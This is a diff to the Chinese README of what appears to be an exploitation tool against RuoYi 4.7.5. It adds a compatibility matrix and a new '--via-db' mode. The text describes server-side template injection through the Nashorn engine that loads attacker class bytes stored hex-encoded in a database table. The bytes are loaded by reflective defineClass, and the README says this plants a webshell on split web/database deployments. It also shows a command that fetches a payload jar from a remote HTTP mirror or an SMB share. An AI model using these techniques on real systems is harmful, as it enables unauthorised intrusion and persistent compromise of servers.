@@ -58,13 +58,15 @@ java -jar ruoyi-gzms.jar ... --mode ssti --jar-url http://镜像/g.jar --drop-to
 
 ## 部署/OS 适配矩阵（实测结论）
 
-| 场景 | job 链 | ssti + jar加载(http/file/UNC) | ssti `--inline` | ssti `--drop-to` |
-|---|---|---|---|---|
-| 站库一体 Linux | ✅ | ✅ | ✅ | ✅（secure_file_priv 空→/tmp；默认锁目录则需 app 可读） |
-| 站库一体 Windows | ✅ | ✅ | ✅ | ✅（Windows MySQL secure_file_priv 多为空 → `C:/...`） |
-| 站库分离（任意 OS） | ✅ | ✅ | ✅ | ❌ 文件落 DB 机盘，web 机读不到 |
-| Windows + 内网未授权 SMB | ✅ | ✅ UNC 直拉 `\\\\host\\share\\g.jar`（走系统 SMB） | ✅ | — |
-| Linux 无出网无共享 | ✅（file: 已落盘路径） | ✅ file: | ✅ | 视同机条件 |
+| 场景 | job 链 | ssti + jar加载(http/file/UNC) | ssti `--inline` | ssti `--drop-to` | ssti `--via-db` |
+|---|---|---|---|---|---|
+| 站库一体 Linux | ✅ | ✅ | ✅ | ✅（secure_file_priv 空→/tmp；默认锁目录则需 app 可读） | ✅ |
+| 站库一体 Windows | ✅ | ✅ | ✅ | ✅（Windows MySQL secure_file_priv 多为空 → `C:/...`） | ✅ |
+| 站库分离（任意 OS） | ✅ | ✅ | ✅ | ❌ 文件落 DB 机盘，web 机读不到 | ✅ **字节走 JDBC，绕开文件系统** |
+| Windows + 内网未授权 SMB | ✅ | ✅ UNC 直拉 `\\\\host\\share\\g.jar`（走系统 SMB） | ✅ | — | ✅ |
+| Linux 无出网无共享 | ✅（file: 已落盘路径） | ✅ file: | ✅ | 视同机条件 | ✅ |
+
+`--via-db` 原理：直连 createTable CTAS 把**工厂类字节**（非整个 jar）hex 存进临时表 → SSTI 的 JS 经 `SpringUtils.getBean(DataSource)` 走 JDBC `SELECT b FROM 表` 拉回 → 反射 defineClass → 进马。web↔DB 本来就通 JDBC，站库分离零影响。实测：docker 站库分离环境全链进马 ✓。
 
 通用注意事项：
 - **JDK 8-14**（SSTI 链依赖 Nashorn `js` 引擎；JDK 15+ 移除了 Nashorn，`--mode ssti` 不可用，job 链不受影响）。RuoYi 4.7.5 常规部署就是 JDK8
